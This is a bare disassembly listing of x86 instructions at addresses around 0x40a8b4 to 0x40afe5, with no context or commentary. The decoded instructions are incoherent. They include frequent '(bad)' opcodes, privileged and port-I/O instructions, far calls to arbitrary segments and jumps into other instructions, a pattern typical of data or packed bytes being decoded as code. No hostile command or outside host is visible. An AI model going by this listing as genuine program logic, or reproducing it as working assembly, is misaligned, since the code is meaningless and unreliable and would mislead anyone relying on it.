  40a8b4:	cmp    DWORD PTR [ebp+0x6662fb88],ecx
  40a8ba:	(bad)  
  40a8bb:	mov    ebx,0xa44e4c3d
  40a8c0:	pop    eax
  40a8c1:	mov    edx,0xb8fe7a9d
  40a8c6:	pop    ebp
  40a8c7:	stc    
  40a8c8:	add    ecx,esp
  40a8ca:	adc    ebx,DWORD PTR [eax-0x11]
  40a8cd:	ret    
  40a8ce:	pushf  
  40a8cf:	sbb    BYTE PTR [ebp+0xd],al
  40a8d2:	mov    bh,0x25
  40a8d4:	xor    al,0xcd
  40a8d6:	outs   dx,BYTE PTR ds:[esi]
  40a8d7:	dec    ebx
  40a8d8:	int    0x8b
  40a8da:	mul    DWORD PTR [ecx]
  40a8dc:	jmp    FWORD PTR [edx+0x5e8ae80f]
  40a8e2:	scas   al,BYTE PTR es:[edi]
  40a8e3:	cmp    bl,BYTE PTR [ebp-0x7dcd901a]
  40a8e9:	pop    ecx
  40a8ea:	cmp    eax,0xafaf8777
  40a8ef:	cs scas eax,DWORD PTR es:[edi]
  40a8f1:	mov    edx,0x34955f2d
  40a8f6:	test   al,0x5f
  40a8f8:	inc    ecx
  40a8f9:	sbb    BYTE PTR [ecx],bh
  40a8fb:	sub    DWORD PTR [ebx+0x3484ed72],esi
  40a901:	pop    ds
  40a902:	dec    esi
  40a903:	faddp  st(1),st
  40a905:	dec    ebx
  40a906:	jmp    FWORD PTR [eax+0x1d]
  40a909:	inc    edx
  40a90a:	sbb    DWORD PTR [ebx+0x60],ebp
  40a90d:	and    eax,0x8460558f
  40a912:	loopne 0x40a8ea
  40a914:	daa    
  40a915:	push   ecx
  40a916:	push   cs
  40a917:	inc    edi
  40a918:	cmp    bh,BYTE PTR [esi]
  40a91a:	mov    dl,0xdc
  40a91c:	aas    
  40a91d:	add    BYTE PTR [eax+edx*4-0x5dfb8dda],al
  40a924:	enter  0x44aa,0x4b
  40a928:	or     BYTE PTR [ebx+ebx*8-0x68],0x4d
  40a92d:	je     0x40a8b5
  40a92f:	icebp  
  40a930:	xor    al,0x65
  40a932:	fst    QWORD PTR [ebx]
  40a934:	imul   ebx,esp,0x4d
  40a937:	jle    0x40a8e4
  40a939:	jecxz  0x40a93a
  40a93b:	ss call 0xb4ac8b21
  40a941:	add    ch,BYTE PTR [ecx+0x75]
  40a944:	push   eax
  40a945:	sti    
  40a946:	sub    al,0xea
  40a948:	jns    0x40a987
  40a94a:	nop
  40a94b:	cdq    
  40a94c:	mov    eax,0x477b147c
  40a951:	(bad)  
  40a952:	aas    
  40a953:	add    DWORD PTR [ebx+edi*8-0x4c26509b],0x19
  40a95b:	leave  
  40a95c:	mov    edx,edx
  40a95e:	cmp    dl,BYTE PTR [edx+esi*8+0x2a2bf235]
  40a965:	(bad)  
  40a966:	in     eax,dx
  40a967:	add    DWORD PTR [ebx-0x24],eax
  40a96a:	lods   al,BYTE PTR ds:[esi]
  40a96b:	pop    ecx
  40a96c:	pop    ebp
  40a96d:	in     eax,0xab
  40a96f:	loop   0x40a94d
  40a971:	call   0xe37fa70b
  40a976:	mov    WORD PTR [eax+0x28],es
  40a979:	fidiv  WORD PTR [edi]
  40a97b:	shl    ecx,1
  40a97d:	mov    eax,0xd93bd4e9
  40a982:	sub    eax,0xcbd48f19
  40a987:	fidivr WORD PTR [ebx+0x51]
  40a98a:	dec    esp
  40a98b:	xchg   edx,eax
  40a98c:	mov    bh,BYTE PTR [ecx-0x45b15488]
  40a992:	mov    ah,0x9c
  40a994:	sbb    dl,BYTE PTR [ebx-0x52]
  40a997:	cs mov edx,0x1a2118f8
  40a99d:	(bad)  
  40a99e:	imul   ebx,DWORD PTR [edx+0x45],0xfffffffd
  40a9a2:	mov    ebp,0x2d8cd6fa
  40a9a7:	into   
  40a9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a9:	mov    al,0x47
  40a9ab:	in     al,dx
  40a9ac:	xchg   esp,eax
  40a9ad:	popa   
  40a9ae:	push   es
  40a9af:	sbb    ebp,ebx
  40a9b1:	cwde   
  40a9b2:	call   0xa8c086e7
  40a9b7:	add    eax,0xe0799a41
  40a9bc:	jnp    0x40a94e
  40a9be:	and    BYTE PTR [eax+ecx*2-0x36],al
  40a9c2:	arpl   di,dx
  40a9c4:	daa    
  40a9c5:	das    
  40a9c6:	sar    DWORD PTR [eax],0x52
  40a9c9:	clc    
  40a9ca:	mov    ebp,0x2a5a3e0d
  40a9cf:	inc    ebx
  40a9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9d1:	or     DWORD PTR [eax+eiz*8-0x6eecdd4d],eax
  40a9d8:	push   ds
  40a9d9:	out    dx,al
  40a9da:	frstor [esi]
  40a9dc:	or     BYTE PTR [ebp+0x3736258d],ch
  40a9e2:	mov    esp,0x71d6cec6
  40a9e7:	push   eax
  40a9e8:	xchg   ebx,eax
  40a9e9:	ds push edx
  40a9eb:	outs   dx,DWORD PTR ds:[esi]
  40a9ec:	pop    ebp
  40a9ed:	add    DWORD PTR [ebx+eax*4-0x1940a706],esp
  40a9f4:	ret    
  40a9f5:	icebp  
  40a9f6:	test   DWORD PTR [ebx+0x45c13e72],esi
  40a9fc:	mov    DWORD PTR [edi+0x2b],ecx
  40a9ff:	in     eax,dx
  40aa00:	das    
  40aa01:	fst    QWORD PTR [esi-0x41139989]
  40aa07:	ret    0x2308
  40aa0a:	add    ch,BYTE PTR [ebp+edi*2-0x6f]
  40aa0e:	loope  0x40a9bf
  40aa10:	xor    al,BYTE PTR [bp+si-0x14]
  40aa14:	add    BYTE PTR [ebp-0x1b6692c0],0x27
  40aa1b:	(bad)  
  40aa1c:	jg     0x40aa2c
  40aa1e:	loope  0x40a9f4
  40aa20:	shr    edi,0x83
  40aa23:	neg    edx
  40aa25:	pop    es
  40aa26:	jle    0x40a9ba
  40aa28:	mov    cr7,ebx
  40aa2b:	test   BYTE PTR [edx+0x1db2c36],al
  40aa31:	std    
  40aa32:	jb     0x40aa2c
  40aa34:	sub    eax,0xc222b24b
  40aa39:	aas    
  40aa3a:	ret    0xa915
  40aa3d:	test   BYTE PTR [esi-0x6ae13b5],ah
  40aa43:	dec    esi
  40aa44:	mov    eax,ds:0xb8dd670
  40aa49:	mov    ah,0x7c
  40aa4b:	jb     0x40aa53
  40aa4d:	cdq    
  40aa4e:	mov    DWORD PTR [esi+0x18995029],edi
  40aa54:	cmp    BYTE PTR [esi+0x39],al
  40aa57:	cmp    eax,0xf3b77a04
  40aa5c:	(bad)  
  40aa5d:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40aa5f:	repz push DWORD PTR [ebx]
  40aa62:	mov    esp,0xcfdae30f
  40aa67:	gs out dx,eax
  40aa69:	cmp    BYTE PTR [edx-0x21],cl
  40aa6c:	(bad)  
  40aa6d:	mov    edi,0x80a66944
  40aa72:	inc    edi
  40aa73:	push   ebx
  40aa74:	mov    edi,0x2adbfb29
  40aa79:	test   al,0xa2
  40aa7c:	retf   
  40aa7d:	in     al,0xcd
  40aa7f:	popa   
  40aa80:	xchg   esp,eax
  40aa81:	leave  
  40aa82:	mov    ch,0x44
  40aa84:	jb     0x40aaee
  40aa86:	fild   QWORD PTR [ebx]
  40aa88:	outs   dx,DWORD PTR ds:[esi]
  40aa89:	jb     0x40aa41
  40aa8b:	dec    edi
  40aa8c:	aam    0x8b
  40aa8e:	mov    al,ds:0xcce9553e
  40aa93:	inc    eax
  40aa94:	inc    edx
  40aa95:	fwait
  40aa96:	mov    bh,0x14
  40aa98:	push   0xffffffd8
  40aa9a:	or     si,ax
  40aa9d:	mov    ecx,0x50b7e0ab
  40aaa2:	pop    esp
  40aaa3:	out    0x5f,al
  40aaa5:	cmp    al,0x34
  40aaa7:	loop   0x40aa93
  40aaa9:	and    eax,0x1f65d7af
  40aaae:	in     al,dx
  40aaaf:	inc    edx
  40aab0:	sub    DWORD PTR [edi-0x1cb08c80],0xfffffffd
  40aab7:	call   0x4095:0xbc8cfa1d
  40aabe:	add    DWORD PTR [edx+0x37],esp
  40aac1:	lock mov dl,al
  40aac4:	pop    ecx
  40aac5:	push   ecx
  40aac6:	cwde   
  40aac7:	add    DWORD PTR [ebp+0x6a],ebp
  40aaca:	outs   dx,BYTE PTR ds:[esi]
  40aacb:	push   edx
  40aacc:	jge    0x40aae9
  40aace:	xchg   ebx,eax
  40aacf:	popf   
  40aad0:	clc    
  40aad1:	or     DWORD PTR [esi-0x50f1525d],esi
  40aad7:	daa    
  40aad8:	add    edi,ebp
  40aada:	cmp    dh,bl
  40aadc:	fs pop edi
  40aade:	or     DWORD PTR [ebx+0x4c],edx
  40aae1:	mov    DWORD PTR [ecx+0x17],ebp
  40aae4:	ins    BYTE PTR es:[edi],dx
  40aae5:	ds cdq 
  40aae7:	out    0x55,al
  40aae9:	sbb    esi,DWORD PTR [edx]
  40aaeb:	lahf   
  40aaec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaed:	adc    eax,0x895bf63c
  40aaf2:	popf   
  40aaf3:	in     eax,dx
  40aaf4:	xchg   edx,eax
  40aaf5:	rcr    edi,0x63
  40aaf8:	xor    esi,DWORD PTR [esi]
  40aafa:	(bad)  
  40aafb:	adc    eax,0x96672e9b
  40ab00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab01:	push   eax
  40ab02:	sti    
  40ab03:	jle    0x40ab1a
  40ab05:	dec    eax
  40ab06:	pop    ebx
  40ab07:	jle    0x40aafa
  40ab09:	aam    0x3e
  40ab0b:	popf   
  40ab0c:	call   0x71b3ac68
  40ab11:	sahf   
  40ab12:	fcmove st,st(7)
  40ab14:	mov    BYTE PTR [eax-0x26],0x1f
  40ab18:	pop    edx
  40ab19:	inc    ebp
  40ab1a:	xchg   esp,eax
  40ab1b:	mov    bl,0xc7
  40ab1d:	dec    ebp
  40ab1e:	pop    edx
  40ab1f:	cwde   
  40ab20:	xor    eax,ebx
  40ab22:	xchg   edx,eax
  40ab23:	arpl   WORD PTR [ecx+0x41],ax
  40ab26:	std    
  40ab27:	or     eax,0xc92d7c25
  40ab2c:	push   es
  40ab2d:	sub    bh,BYTE PTR [edi-0x6e]
  40ab30:	dec    ebp
  40ab31:	sub    edi,DWORD PTR [esi+0x77]
  40ab34:	mov    bh,0xbb
  40ab36:	jge    0x40ab3c
  40ab38:	inc    edi
  40ab39:	js     0x40aad1
  40ab3b:	(bad)  
  40ab3c:	repnz inc ecx
  40ab3e:	daa    
  40ab3f:	pop    esp
  40ab40:	pop    ss
  40ab41:	inc    ebp
  40ab42:	or     ch,BYTE PTR [ebp+0x4bca4cb5]
  40ab48:	dec    esi
  40ab49:	pop    edx
  40ab4a:	pushf  
  40ab4b:	pop    ss
  40ab4c:	dec    edx
  40ab4d:	mov    al,0xb
  40ab4f:	rcr    DWORD PTR [esi+eiz*8-0x8a4230],1
  40ab56:	sub    esp,DWORD PTR [ecx-0x62]
  40ab59:	hlt    
  40ab5a:	(bad)  
  40ab5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab5c:	jg     0x40ab49
  40ab5e:	add    BYTE PTR [esi-0x80],ch
  40ab61:	sub    BYTE PTR ds:0x6a8acabc,cl
  40ab67:	ds sub ebp,0x2ea1d9c2
  40ab6e:	not    DWORD PTR [eax]
  40ab70:	sub    DWORD PTR ds:[ebp-0x90e12af],ecx
  40ab77:	and    ebp,DWORD PTR [eax]
  40ab79:	or     al,0x87
  40ab7b:	add    dh,BYTE PTR [ebp-0x6c9d63bf]
  40ab81:	mov    al,ds:0xc1f0d2ab
  40ab86:	mov    dh,0x82
  40ab88:	das    
  40ab89:	aad    0x3
  40ab8b:	xchg   edi,edi
  40ab8d:	push   edx
  40ab8e:	cmp    BYTE PTR [edx-0x26],bl
  40ab91:	push   edx
  40ab92:	pop    es
  40ab93:	jmp    0x40ab54
  40ab95:	pop    esi
  40ab96:	ins    DWORD PTR es:[edi],dx
  40ab97:	enter  0x5c3f,0xd7
  40ab9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab9c:	mov    ebp,0x3dcf8b6f
  40aba1:	fldenv [esp+eax*4]
  40aba4:	cwde   
  40aba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aba6:	mov    ah,0xfa
  40aba8:	dec    esi
  40aba9:	and    ecx,DWORD PTR [edi]
  40abab:	les    esi,FWORD PTR [ecx]
  40abad:	daa    
  40abae:	dec    ecx
  40abaf:	sbb    al,BYTE PTR [esi]
  40abb1:	bndstx [ecx+0x48a87477],bnd3
  40abb8:	loopne 0x40abab
  40abba:	jns    0x40ac22
  40abbc:	retf   0xfa3c
  40abbf:	jb     0x40ab87
  40abc1:	sbb    eax,0x44b86be1
  40abc6:	or     BYTE PTR [ebp+0x27b0b030],dh
  40abcc:	(bad)  
  40abcd:	jo     0x40ab51
  40abcf:	shr    BYTE PTR [esi+ebx*8+0x2bdee0b2],cl
  40abd6:	xlat   BYTE PTR ds:[ebx]
  40abd7:	adc    DWORD PTR [ebx-0x6f],0x9
  40abdb:	push   ebx
  40abdc:	nop
  40abdd:	inc    ebp
  40abde:	cmp    ebx,DWORD PTR [edx+0x55]
  40abe1:	cmp    al,0x18
  40abe3:	jno    0x40ac1a
  40abe5:	sbb    al,0x55
  40abe7:	xchg   ebx,eax
  40abe8:	add    BYTE PTR [ebx],cl
  40abea:	es pop ecx
  40abec:	cmp    eax,0xf9f3fdb1
  40abf1:	enter  0xb33e,0x97
  40abf5:	and    al,0xb
  40abf7:	dec    esi
  40abf8:	mov    esp,0x724b3406
  40abfd:	dec    ebx
  40abfe:	hlt    
  40abff:	data16 shl BYTE PTR [ecx],cl
  40ac02:	loop   0x40abf1
  40ac04:	or     al,BYTE PTR [edi]
  40ac06:	cld    
  40ac07:	retf   
  40ac08:	or     esp,0x5d
  40ac0b:	adc    BYTE PTR [esp+ecx*8],0x2
  40ac0f:	fdiv   st,st(2)
  40ac11:	mov    ch,0xa1
  40ac13:	scas   al,BYTE PTR es:[edi]
  40ac14:	dec    ecx
  40ac15:	std    
  40ac16:	es inc ebp
  40ac18:	imul   DWORD PTR [edx-0xe885560]
  40ac1e:	mov    ecx,0xec213951
  40ac23:	sbb    al,0xa3
  40ac25:	stos   BYTE PTR es:[edi],al
  40ac26:	out    dx,al
  40ac27:	push   0xffffffba
  40ac29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac2a:	and    al,BYTE PTR [edx+0x9]
  40ac2d:	arpl   di,di
  40ac2f:	lea    esp,[edx-0x19978c1b]
  40ac35:	scas   al,BYTE PTR es:[edi]
  40ac36:	adc    ebp,DWORD PTR [ebx+esi*4+0x3b]
  40ac3a:	mov    BYTE PTR [edx],dh
  40ac3c:	mov    esp,0xf27b92a3
  40ac41:	nop
  40ac42:	add    ebx,DWORD PTR [ebp-0x2a]
  40ac45:	sti    
  40ac46:	arpl   WORD PTR [ebx+ebp*2+0x0],di
  40ac4a:	pop    ebx
  40ac4b:	ins    DWORD PTR es:[edi],dx
  40ac4c:	fld    DWORD PTR [esi]
  40ac4e:	cwde   
  40ac4f:	dec    ecx
  40ac50:	xor    edx,esi
  40ac52:	in     al,dx
  40ac53:	retf   
  40ac54:	add    ch,dl
  40ac56:	xor    BYTE PTR [ebp+ebx*1+0x29],ah
  40ac5a:	icebp  
  40ac5b:	lock enter 0x18d5,0x69
  40ac60:	pop    ds
  40ac61:	aaa    
  40ac62:	les    ebp,FWORD PTR [edx-0x66]
  40ac65:	test   al,0x29
  40ac67:	je     0x40abf2
  40ac69:	dec    ebx
  40ac6a:	xchg   ebx,eax
  40ac6b:	jb     0x40ac26
  40ac6d:	xor    eax,0x6dc07da5
  40ac72:	bound  esi,QWORD PTR [edx]
  40ac74:	lock ret 0x4794
  40ac78:	imul   DWORD PTR [edx-0x20c0bbeb]
  40ac7e:	jmp    0x40ace4
  40ac80:	and    eax,DWORD PTR [ebp-0x14253502]
  40ac86:	dec    edi
  40ac87:	mov    ebp,0x5185aecb
  40ac8c:	ja     0x40ac73
  40ac8e:	sar    ecx,cl
  40ac90:	out    0x6,eax
  40ac92:	enter  0x20c8,0x3b
  40ac96:	lock in eax,dx
  40ac98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac99:	sub    al,0x2b
  40ac9b:	mov    edx,0xd49a4176
  40aca0:	(bad)  
  40aca1:	hlt    
  40aca2:	in     al,dx
  40aca3:	js     0x40ace4
  40aca5:	fidivr DWORD PTR [esi+0x7f43fa13]
  40acab:	add    bh,cl
  40acad:	jle    0x40acaa
  40acaf:	cmp    DWORD PTR [edx+0x49],0xd514a3a5
  40acb6:	inc    ebp
  40acb7:	pop    DWORD PTR [ebx]
  40acb9:	xchg   WORD PTR [edx-0x7e2234a5],cx
  40acc0:	inc    ebp
  40acc1:	retf   
  40acc2:	imul   esp,DWORD PTR [ebx+0x6333224c],0x3c
  40acc9:	out    dx,eax
  40acca:	jl     0x40ac51
  40accc:	push   ecx
  40accd:	sbb    al,0x25
  40accf:	jnp    0x40ac65
  40acd1:	pop    edi
  40acd2:	dec    ecx
  40acd3:	ins    BYTE PTR es:[edi],dx
  40acd4:	call   DWORD PTR [esi+ecx*4-0x6a]
  40acd8:	addr16 pusha 
  40acda:	pop    ebx
  40acdb:	test   DWORD PTR ds:0x2ac67c78,edx
  40ace1:	mov    ds:0x64b712b4,al
  40ace6:	bound  ecx,QWORD PTR [edi+0x2e]
  40ace9:	add    al,0x67
  40aceb:	leave  
  40acec:	push   ss
  40aced:	retf   0x7ff8
  40acf0:	pop    ss
  40acf1:	inc    edx
  40acf2:	in     al,dx
  40acf3:	mov    eax,ds:0x6a1ddbe2
  40acf8:	adc    al,0x6f
  40acfa:	loopne 0x40ad30
  40acfc:	test   eax,0xa07d6139
  40ad01:	mov    ecx,0xf8de002e
  40ad06:	das    
  40ad07:	jo     0x40ad61
  40ad09:	in     al,dx
  40ad0a:	push   ebp
  40ad0b:	add    bh,BYTE PTR [eax]
  40ad0d:	es xchg edx,eax
  40ad0f:	jo     0x40ad8a
  40ad11:	inc    ecx
  40ad12:	mov    ds:0x7dd27457,eax
  40ad17:	sahf   
  40ad18:	sbb    BYTE PTR [eax],dl
  40ad1a:	outs   dx,DWORD PTR ds:[esi]
  40ad1b:	mov    ebx,0xb78473ae
  40ad20:	xor    al,0xa1
  40ad22:	in     eax,dx
  40ad23:	inc    ebp
  40ad24:	sub    ch,BYTE PTR [esi]
  40ad26:	popf   
  40ad27:	das    
  40ad28:	xor    DWORD PTR [esi+0x45df2bb9],ebp
  40ad2e:	xchg   DWORD PTR [edx+ebx*1],ebx
  40ad31:	or     edx,DWORD PTR [ecx-0x33]
  40ad34:	inc    ecx
  40ad35:	outs   dx,BYTE PTR ds:[esi]
  40ad36:	daa    
  40ad37:	aam    0x5c
  40ad39:	pop    esp
  40ad3a:	(bad)  
  40ad3b:	or     dl,ch
  40ad3d:	pop    ebx
  40ad3e:	jge    0x40acce
  40ad40:	push   eax
  40ad41:	retf   0xe0e1
  40ad44:	push   ebx
  40ad45:	in     eax,dx
  40ad46:	icebp  
  40ad47:	scas   al,BYTE PTR es:[edi]
  40ad48:	mov    esi,0xd50ef794
  40ad4d:	cmp    eax,0xb05f4eb0
  40ad52:	add    al,0x2
  40ad54:	xor    dl,BYTE PTR [ebx+ebp*2]
  40ad57:	and    dl,BYTE PTR [ebp-0x51]
  40ad5a:	xor    ebx,DWORD PTR [edx+0x3c]
  40ad5d:	pop    ss
  40ad5e:	add    al,0xa9
  40ad60:	inc    ebx
  40ad61:	mov    ebx,0x28f15e3d
  40ad66:	lds    esp,FWORD PTR ds:0x59dad263
  40ad6c:	pop    ebx
  40ad6d:	retw   0x64be
  40ad71:	mov    edx,0x768b095
  40ad76:	(bad)  
  40ad77:	fst    QWORD PTR [eax-0x4d]
  40ad7a:	test   eax,0x3ad1aee
  40ad7f:	aad    0xb2
  40ad81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad83:	jmp    0x40ad20
  40ad85:	or     DWORD PTR [esi+0x46532400],edx
  40ad8b:	popa   
  40ad8c:	pop    esi
  40ad8d:	and    esi,DWORD PTR [eax+eax*1-0x2dbc28fc]
  40ad94:	out    dx,eax
  40ad95:	lock xchg edi,eax
  40ad97:	inc    edx
  40ad98:	mul    dl
  40ad9a:	pop    ds
  40ad9b:	xor    esp,edx
  40ad9d:	lods   eax,DWORD PTR ds:[esi]
  40ad9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad9f:	sahf   
  40ada0:	in     al,0xaf
  40ada2:	call   0xc235:0x9cbcb1f8
  40ada9:	jmp    0x40ad3a
  40adab:	inc    DWORD PTR [eax]
  40adad:	fs icebp 
  40adaf:	pop    ebx
  40adb0:	hlt    
  40adb1:	push   0xffffff9b
  40adb3:	pop    eax
  40adb4:	mov    ecx,esp
  40adb6:	dec    ebp
  40adb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adb8:	or     esp,DWORD PTR ds:0x86cafc74
  40adbe:	and    ecx,DWORD PTR [esi+eax*2-0x689fb656]
  40adc5:	repz shl DWORD PTR [edx-0x27],1
  40adc9:	mov    cl,0x9e
  40adcb:	xchg   ebx,eax
  40adcc:	mov    dh,0xfa
  40adce:	ins    DWORD PTR es:[edi],dx
  40adcf:	dec    edi
  40add0:	aam    0xd6
  40add2:	dec    edx
  40add3:	hlt    
  40add4:	call   0xf180:0x946461ef
  40addb:	add    BYTE PTR [esi+0x63248c2e],bh
  40ade1:	les    edx,FWORD PTR [eax+eax*1-0x2b]
  40ade5:	in     al,dx
  40ade6:	pop    esp
  40ade7:	sahf   
  40ade8:	cmp    eax,0x68af7d69
  40aded:	pop    esp
  40adee:	dec    esi
  40adef:	enter  0x9148,0xe3
  40adf3:	push   ebx
  40adf4:	(bad)  
  40adf5:	(bad)  
  40adf6:	push   ss
  40adf7:	push   cs
  40adf8:	cmp    bl,BYTE PTR [edx+ebp*1-0x63]
  40adfc:	out    0xe1,al
  40adfe:	mov    ds,WORD PTR [eax]
  40ae00:	outs   dx,BYTE PTR ds:[esi]
  40ae01:	outs   dx,BYTE PTR ds:[esi]
  40ae02:	hlt    
  40ae03:	and    eax,0x336610f3
  40ae08:	inc    esp
  40ae09:	inc    ecx
  40ae0a:	sub    bh,BYTE PTR [ecx+0x73925fc9]
  40ae10:	cwde   
  40ae11:	dec    ecx
  40ae12:	push   edi
  40ae13:	pop    ss
  40ae14:	mov    ch,0xa7
  40ae16:	in     eax,dx
  40ae17:	cdq    
  40ae18:	mov    ah,0xf2
  40ae1a:	scas   eax,DWORD PTR es:[edi]
  40ae1b:	dec    edx
  40ae1c:	push   esi
  40ae1d:	sbb    BYTE PTR [edi+0x22],0x1b
  40ae21:	out    0xc8,eax
  40ae23:	jmp    0xd1d98f6c
  40ae28:	mov    edi,0x9d3120f4
  40ae2d:	test   al,0x68
  40ae2f:	dec    edx
  40ae30:	jge    0x40adfd
  40ae32:	cmp    al,0x79
  40ae34:	push   0x7ccc5519
  40ae39:	inc    edx
  40ae3a:	mov    edi,0xb557cfb8
  40ae3f:	jl     0x40ae60
  40ae41:	ins    DWORD PTR es:[edi],dx
  40ae42:	mov    dl,0xae
  40ae44:	repnz inc edx
  40ae46:	test   ecx,edx
  40ae48:	jmp    FWORD PTR [edi-0x75]
  40ae4b:	out    dx,al
  40ae4c:	mov    ch,ah
  40ae4e:	out    dx,eax
  40ae4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae50:	jnp    0x40ae76
  40ae52:	out    0xb0,eax
  40ae54:	mov    al,0x84
  40ae56:	sub    eax,0xbad745b8
  40ae5b:	popf   
  40ae5c:	lds    ebp,FWORD PTR fs:[ebp-0x686bb645]
  40ae63:	cmc    
  40ae64:	sbb    BYTE PTR [esi*2+0x1c72d13f],0xd3
  40ae6c:	je     0x40aec8
  40ae6e:	cmp    al,0x41
  40ae70:	xchg   esp,eax
  40ae71:	test   al,0x1e
  40ae73:	pop    ss
  40ae74:	(bad)  
  40ae75:	(bad)  
  40ae77:	cmp    DWORD PTR [ebp+0x47a01c65],ebp
  40ae7d:	adc    edx,DWORD PTR [edi]
  40ae7f:	jmp    0xe3157f9f
  40ae84:	fst    QWORD PTR [edi+0x44]
  40ae87:	push   0xf66606e8
  40ae8c:	add    DWORD PTR [ecx],0xffffffe4
  40ae8f:	enter  0x358d,0x1c
  40ae93:	call   0xc4bd:0x17981254
  40ae9a:	push   ss
  40ae9b:	hlt    
  40ae9c:	cli    
  40ae9d:	push   edi
  40ae9e:	sbb    al,0x14
  40aea0:	add    eax,0x79633abf
  40aea5:	loop   0x40aebc
  40aea7:	mov    ch,0xb2
  40aea9:	aam    0x95
  40aeab:	daa    
  40aeac:	neg    BYTE PTR [edi+0x14c27822]
  40aeb2:	lahf   
  40aeb3:	or     eax,0x31d5cf1a
  40aeb8:	stos   BYTE PTR es:[edi],al
  40aeb9:	jg     0x40aec7
  40aebb:	iretw  
  40aebd:	or     eax,0xb786ae5b
  40aec2:	jle    0x40aed4
  40aec4:	lock sahf 
  40aec6:	fs dec ecx
  40aec8:	and    esp,DWORD PTR [edx+0x621405b4]
  40aece:	xor    edx,ebp
  40aed0:	cmp    cl,dl
  40aed2:	fst    DWORD PTR [edi+0x36]
  40aed5:	test   DWORD PTR [ecx-0x17],ebp
  40aed8:	ins    BYTE PTR es:[edi],dx
  40aed9:	push   es
  40aeda:	dec    esi
  40aedb:	std    
  40aedc:	mov    esp,0xb9205ab
  40aee1:	jg     0x40af0d
  40aee3:	mov    bl,0x8a
  40aee5:	dec    ebx
  40aee6:	ret    0x6d02
  40aee9:	test   eax,0xf3f22008
  40aeee:	sbb    cl,BYTE PTR [edx+0x42f02786]
  40aef4:	cmp    bh,dl
  40aef6:	ror    DWORD PTR [ebx-0x23],cl
  40aef9:	and    DWORD PTR [edi],0x6b4e88b2
  40aeff:	push   ds
  40af00:	rol    DWORD PTR [esi-0x63],0xe0
  40af04:	mov    BYTE PTR [esi+0x35],ch
  40af07:	jnp    0x40af22
  40af09:	clc    
  40af0a:	xor    cl,bl
  40af0c:	ror    DWORD PTR [eax],cl
  40af0e:	jle    0x40aec1
  40af10:	sub    al,0xcb
  40af12:	pop    ecx
  40af13:	jmp    0xff41:0xd7bc36c8
  40af1a:	xlat   BYTE PTR fs:[ebx]
  40af1c:	in     al,dx
  40af1d:	not    BYTE PTR [ebx+0x7f34b460]
  40af23:	sbb    esi,DWORD PTR [ecx]
  40af25:	sub    bl,dl
  40af27:	push   ebx
  40af28:	lock clc 
  40af2a:	pop    ebx
  40af2b:	jne    0x40aeef
  40af2d:	scas   eax,DWORD PTR es:[edi]
  40af2e:	scas   al,BYTE PTR es:[edi]
  40af2f:	iret   
  40af30:	imul   ebp,DWORD PTR [ebx-0x55851299],0x0
  40af37:	mov    al,ds:0x2c402aea
  40af3c:	xor    ebx,DWORD PTR [ebx]
  40af3e:	pop    ds
  40af3f:	xchg   DWORD PTR cs:[edi-0x7b3626cd],ebx
  40af46:	(bad)
  40af49:	dec    ebx
  40af4a:	int    0xb1
  40af4c:	jae    0x40af68
  40af4e:	xchg   edx,eax
  40af4f:	scas   al,BYTE PTR es:[edi]
  40af50:	out    dx,al
  40af51:	cld    
  40af52:	jp     0x40afc8
  40af54:	and    BYTE PTR [eax+0x48],ah
  40af57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af59:	pushf  
  40af5a:	out    0xa6,eax
  40af5c:	xlat   BYTE PTR ds:[ebx]
  40af5d:	or     DWORD PTR [ecx-0x75],esi
  40af60:	nop
  40af61:	pop    esp
  40af62:	(bad)  
  40af63:	mov    ah,0x79
  40af65:	scas   al,BYTE PTR es:[edi]
  40af66:	out    dx,al
  40af67:	jmp    0x40af4d
  40af69:	push   edi
  40af6a:	push   ds
  40af6b:	mov    dh,0xa6
  40af6d:	jns    0x40af66
  40af6f:	into   
  40af70:	pop    edx
  40af71:	cmp    eax,0xe0b6a905
  40af76:	shl    ebp,1
  40af78:	cld    
  40af79:	adc    eax,0x2f7ab6d5
  40af7e:	adc    cl,bl
  40af80:	xor    bh,BYTE PTR [esi]
  40af82:	push   ecx
  40af83:	repz dec ecx
  40af85:	call   0x16d6:0xdf63b66b
  40af8c:	call   0x3415:0xb0fef9cf
  40af93:	inc    ebx
  40af94:	xor    BYTE PTR [ebx-0x7dac39e2],dh
  40af9a:	lds    ecx,FWORD PTR [ebx]
  40af9c:	mov    esi,0x806fc9b9
  40afa1:	and    dh,ch
  40afa3:	inc    edi
  40afa4:	push   ecx
  40afa5:	imul   esi,DWORD PTR [ebp-0x3a],0xffffff89
  40afa9:	into   
  40afaa:	or     ebp,ebp
  40afac:	repz cwde 
  40afae:	enter  0xef6f,0x7a
  40afb2:	dec    edx
  40afb3:	push   ebp
  40afb4:	jae    0x40afbb
  40afb6:	test   eax,0xafd908b4
  40afbb:	jno    0x40b000
  40afbd:	int    0x30
  40afbf:	and    BYTE PTR [eax+0x4ea41922],cl
  40afc5:	daa    
  40afc6:	jp     0x40af53
  40afc8:	fwait
  40afc9:	sahf   
  40afca:	and    al,0x29
  40afcc:	xchg   BYTE PTR [ebp-0x2bd38274],dl
  40afd2:	mov    bh,0xb7
  40afd4:	push   edi
  40afd5:	or     DWORD PTR [edx-0x45cce886],0xf563b150
  40afdf:	mov    ah,BYTE PTR [edi]
  40afe1:	xchg   edi,eax
  40afe2:	out    0x40,eax
  40afe4:	pop    esi
  40afe5:	sbb    al,0x98
